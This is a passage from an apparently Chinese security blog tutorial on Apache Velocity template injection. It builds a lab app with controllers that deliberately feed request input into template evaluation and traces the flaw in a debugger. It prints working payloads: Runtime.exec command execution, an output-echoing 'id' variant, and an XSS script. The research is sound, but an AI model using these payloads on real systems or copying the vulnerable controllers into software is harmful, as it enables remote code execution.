class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- velocity依赖 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.velocity<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>velocity<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.73<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>Velocity_SSTI<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pluginManagement</span>&gt;</span><span class="comment">&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-clean-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-resources-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-surefire-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.22.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-war-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-install-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-deploy-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">pluginManagement</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在WEB-INF里面创建一个文件夹views，再在views文件夹中创建一个模板文件：hello.vm</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, $name <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="Mk0RfqkE1_8djqCltrDnT5ZwEJpRaGFeUvDJyOdlU3o.png" alt="image"></p>
+<p>创建一个controller包之后创建一个controller控制器：MyController.java</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">package com.garck3h.controller;</span><br><span class="line">/**</span><br><span class="line">* Created by IntelliJ IDEA.</span><br><span class="line">*</span><br><span class="line">* @Author Garck3h</span><br><span class="line">* @Date 2023/6/25 2:30 下午</span><br><span class="line">* Life is endless, and there is no end to it.</span><br><span class="line">**/</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.ui.Model;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">public class MyController &#123;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&quot;/hello&quot;)</span><br><span class="line">    public String demo(Model model) &#123;</span><br><span class="line">        // 向模板中添加数据</span><br><span class="line">        model.addAttribute(&quot;name&quot;, &quot;Hello, Velocity!&quot;);</span><br><span class="line"></span><br><span class="line">        // 返回Velocity模板路径</span><br><span class="line">        return &quot;hello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="-AZ7UitZD6Nv84pI9gzw7caldSmlH3Zd80ySeXDEIdk.png" alt="image"></p>
+<p>启动tomcat进行访问：<a target="_blank" rel="noopener" href="http://192.168.108.154:8090/hello">http://192.168.108.154:8090/hello</a></p>
+<p><img src="drE0opZbun1nheG2qrLoD3gM1OlefU4yffK4mjoFMEM.png" alt="image"></p>
+<h2 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h2><ul>
+<li>输出变量；在模板中，$name表示一个变量，当模板被渲染时，变量会被替换为具体的值。</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Welcome $name!</span><br></pre></td></tr></table></figure>
+<ul>
+<li>条件判断：使用#if、#else和#end语句可以进行条件判断，根据条件的真假来执行不同的操作。</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#if($age &gt;= 18)</span><br><span class="line">    You are an adult.</span><br><span class="line">#else</span><br><span class="line">    You are a minor.</span><br><span class="line">#end</span><br></pre></td></tr></table></figure>
+<ul>
+<li>迭代循环：通过<code>#foreach</code>语句可以对集合进行迭代循环，并在每次循环中使用<code>$item</code>表示当前迭代的元素。</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#foreach($item in $items)</span><br><span class="line">    $item</span><br><span class="line">#end</span><br></pre></td></tr></table></figure>
+<ul>
+<li>导入外部包：使用#import语句可以导入外部Java类，以便在模板中使用其方法和属性。</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#import(&quot;com.example.MyClass&quot;)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>字符串拼接：可以使用#set指令将字符串赋值给变量，并通过直接引用变量进行字符串拼接。</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#set($firstName = &quot;John&quot;)</span><br><span class="line">#set($lastName = &quot;Doe&quot;)</span><br><span class="line">$firstName $lastName</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li>访问对象属性：</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Name: $person.name<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Age: $person.age<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>调用静态方法：假设存在一个名为mathUtil的Java类，其中有一个静态方法add(a, b)，则可以通过$mathUtil.add(5, 3)来调用该静态方法并将结果赋值给变量。</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#set($result = $mathUtil.add(5, 3))</span><br><span class="line">Result: $result</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="evaluate触发"><a href="#evaluate触发" class="headerlink" title="evaluate触发"></a>evaluate触发</h3><p>evaluate方法使用VelocityEngine的evaluate方法来执行Velocity模板的评估。用户输入通过HttpServletRequest对象获取，并放入VelocityContext中进行渲染。</p>
+<p>我们分别创建一个Controller和一个evaluate.vm（WEB-INF&#x2F;views&#x2F;evaluate.vm）模板文件</p>
+<p>VelocityInjectionController.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.garck3h.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.Template;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.VelocityContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.app.VelocityEngine;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.runtime.RuntimeConstants;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VelocityInjectionController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/evaluate&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">evaluate</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 从请求参数中获取模板值</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">template</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;template&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 动态创建Velocity上下文并设置参数</span></span><br><span class="line">        <span class="type">VelocityContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VelocityContext</span>();</span><br><span class="line">        context.put(<span class="string">&quot;params&quot;</span>, request.getParameterMap());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建VelocityEngine实例</span></span><br><span class="line">        <span class="type">VelocityEngine</span> <span class="variable">engine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VelocityEngine</span>();</span><br><span class="line">        <span class="comment">// 创建StringWriter对象，用于保存模板合并的结果</span></span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">        <span class="comment">// 对模板进行合并，并将结果写入StringWriter对象中</span></span><br><span class="line">        engine.evaluate(context, sw, <span class="string">&quot;TemplateInjectionTest&quot;</span>, template);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建ModelAndView对象，指定视图名为&quot;evaluate&quot;</span></span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>(<span class="string">&quot;evaluate&quot;</span>);</span><br><span class="line">        <span class="comment">// 将模板合并的结果作为属性添加到ModelAndView对象中</span></span><br><span class="line">        modelAndView.addObject(<span class="string">&quot;evaluate&quot;</span>, sw.toString());</span><br><span class="line">        <span class="comment">// 返回ModelAndView对象</span></span><br><span class="line">        <span class="keyword">return</span> modelAndView;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>evaluate.vm</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Welcome&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Hello, $evaluate&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>启动之后我们在浏览器进行访问，并且给template进行传参</p>
+<p><img src="R6EH2eLX9EkBK8ciXUvBDHqx6WEYF4ccqz9f1i1unmQ.png" alt="image"></p>
+<p>当我输入如下的payload，即可执行命令弹计算器。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.1.7:8090/evaluate?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//192.168.1.7:8090/evaluate?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22open%20-a%20calculator%22)</span></span><br></pre></td></tr></table></figure>
+<p>payload分析：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#set($e=&quot;e&quot;)：定义了一个Velocity变量$e，并赋值为字符串&quot;e&quot;。</span><br><span class="line">$e.getClass()：获取变量$e的运行时类。</span><br><span class="line">.forName(&quot;java.lang.Runtime&quot;)：通过反射加载java.lang.Runtime类。</span><br><span class="line">.getMethod(&quot;getRuntime&quot;, null)：使用反射获取Runtime类的getRuntime方法，该方法返回Runtime类的实例。</span><br><span class="line">.invoke(null, null)：使用反射调用getRuntime方法，参数为null，因为该方法不接受任何参数。这将返回Runtime类的实例。</span><br><span class="line">.exec(&quot;open -a calculator&quot;)：使用Runtime类的实例的exec方法执行操作系统命令。在这里，命令是open -a calculator，即打开Mac的计算器</span><br></pre></td></tr></table></figure>
+<p><img src="FXDvMw-mZbFKkJWy2WeQxLuvD_MnxY5szaLGd5tY71A.png" alt="image"></p>
+<p>当执行来到engine.evaluate；我们跟进去，直接就看到了RuntimeInstance.evaluate；最后会调用 render 方法将解析后的内容渲染到 writer 中，并返回渲染结果。</p>
+<p><img src="OTTrkwaD48kmWMeLr0eWwk-czU0HNp-cfJI_aC8yzQM.png" alt="image"></p>
+<p>我们跟进到render；这里主要实现的是将解析后的节点树渲染到指定的写入器中。</p>
+<p>首先在634行调用 nodeTree.init对节点树进行初始化。接着调用 nodeTree.render将节点树渲染到写入器中。</p>
+<p><img src="GEzXUDp1CKnts7uiCddd7xC_F3jowMmURa2EGbhSnHs.png" alt="image"></p>
+<p>我们跟进去到render。这里主要实现的是获取节点树的子节点数量，并使用 for 循环遍历所有子节点。通过 jjtGetChild(i) 方法获取第 i 个子节点，并调用其 render 方法来渲染子节点内容到指定的写入器中。</p>
+<p><img src="UGMcgk69DSeynfPc6YWa5jdgi7DD3Ien02rrvHwHIZU.png" alt="image"></p>
+<p>继续跟进jjtGetChild(i).render；最后来到了ASTReference.render.</p>
+<p>先判断this.referenceType 的值是否为 4；然后判断this.escaped 的值为false</p>
+<p><img src="Sz0JaLsEbm3rHrBO7prHwhKmajlCTrr8GtLim-n9zns.png" alt="image"></p>
+<p>继续跟进来之后，就到了ASTMethod.execute。这里接受一个 Object 对象和一个 InternalContextAdapter 对象作为参数。我们直接看到</p>
+<p>64行调用 method.invoke(o, params) 方法执行方法调用，并将结果存储在 obj 变量中。</p>
+<p><img src="cx6U8Dy33SZ83zMkgy0RsbRxvAdG7SE2UCCdSD41DiM.png" alt="image"></p>
+<p>跟进去查看invoke；判断方法是否为可变参数方法，如果是就进行一系列操作。最后调用doInvoke方法执行实际的方法调用，并返回结果。</p>
+<p>而doInvoke方法，正是下面的doInvoke方法</p>
+<p><img src="2rmWK-yuQD5cNSkFKD1bB8tNjQdUs36-LlqVe2N-oCY.png" alt="image"></p>
+<p>即最后调用的是Java反射里面的invoke，进行执行</p>
+<p><img src="gqHxkuWfjGAmXS_7sZ40jgETA1al3QAwPHopOAOXxlk.png" alt="image"></p>
+<p><img src="QGSEIAGjGerH-YO291vvHX5DqtdFE709g359lPuCM8o.png" alt="image"></p>
+<p>思考了一下，也可能存在XSS，于是反射的XSS尝试</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.51.154:8090/evaluate?template=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="AlCh1405RmIsFuw0LhyvhXbiWXaQO1KO5oxHnNzjjYE.png" alt="image"></p>
+<h3 id="merge触发"><a href="#merge触发" class="headerlink" title="merge触发"></a>merge触发</h3><p>merge方法使用VelocityEngine的getTemplate方法获取指定的模板文件，然后使用merge方法将模板和上下文数据合并为最终结果。</p>
+<p>创建一个servlet</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.garck3h.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.Template;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.VelocityContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.app.VelocityEngine;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.runtime.RuntimeConstants;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VelocityInjectionController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/merge&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> ModelAndView <span class="title function_">merge</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 从请求参数中获取模板值</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">template</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;template&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从classpath中加载Velocity模板</span></span><br><span class="line">        <span class="type">VelocityEngine</span> <span class="variable">engine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VelocityEngine</span>();</span><br><span class="line">        engine.setProperty(RuntimeConstants.RESOURCE_LOADER, <span class="string">&quot;classpath&quot;</span>);</span><br><span class="line">        engine.setProperty(<span class="string">&quot;classpath.resource.loader.class&quot;</span>, ClasspathResourceLoader.class.getName());</span><br><span class="line">        engine.init();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 动态创建Velocity上下文并设置参数</span></span><br><span class="line">        <span class="type">VelocityContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VelocityContext</span>();</span><br><span class="line">        context.put(<span class="string">&quot;params&quot;</span>, request.getParameterMap());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 进行模板合并</span></span><br><span class="line">        <span class="type">Template</span> <span class="variable">tpl</span> <span class="operator">=</span> engine.getTemplate(template);</span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">        tpl.merge(context, sw);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建ModelAndView对象，指定视图名为&quot;hello&quot;</span></span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="comment">// 将模板合并的结果作为属性添加到ModelAndView对象中</span></span><br><span class="line">        modelAndView.addObject(<span class="string">&quot;hello&quot;</span>, sw.toString());</span><br><span class="line">        <span class="comment">// 返回ModelAndView对象</span></span><br><span class="line">        <span class="keyword">return</span> modelAndView;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="6gHMHG98hAQ6hRAKpP-0COCLICmlK0FcRITxbFCFle0.png" alt="image"></p>
+<p>当我们能上传或者更改vm的时候，我们插入一下的内容到vm模板中</p>
+<p>再在resources&#x2F;templates中新建一个模板：merge.vm</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#set($e=<span class="string">&quot;e&quot;</span>);$e.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&quot;open -a calculator&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="mcr9pym-U7v_SjkGkg7YrfFDL9fE_h8Di3CobRzLmD4.png" alt="image"></p>
+<p>启动项目之后进行访问即可执行模板里面的代码，当然这个${name}是我hello模板里面的内容。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.51.154:8090/merge?template=/templates/merge.vm</span></span><br></pre></td></tr></table></figure>
+<p><img src="lxJHRmZLBd0hlYOZ5e9qgw_VRUUHll3bCjkxUlVpV2s.png" alt="image"></p>
+<h2 id="有回显示的payload"><a href="#有回显示的payload" class="headerlink" title="有回显示的payload"></a>有回显示的payload</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#set($x=&#x27;&#x27;)+#set($rt=$x.class.forName(&#x27;java.lang.Runtime&#x27;))+#set($chr=$x.class.forName(&#x27;java.lang.Character&#x27;))+#set($str=$x.class.forName(&#x27;java.lang.String&#x27;))+#set($ex=$rt.getRuntime().exec(&#x27;id&#x27;))+$ex.waitFor()+#set($out=$ex.getInputStream())+#foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br></pre></td></tr></table></figure>
+<p>payload解释</p>
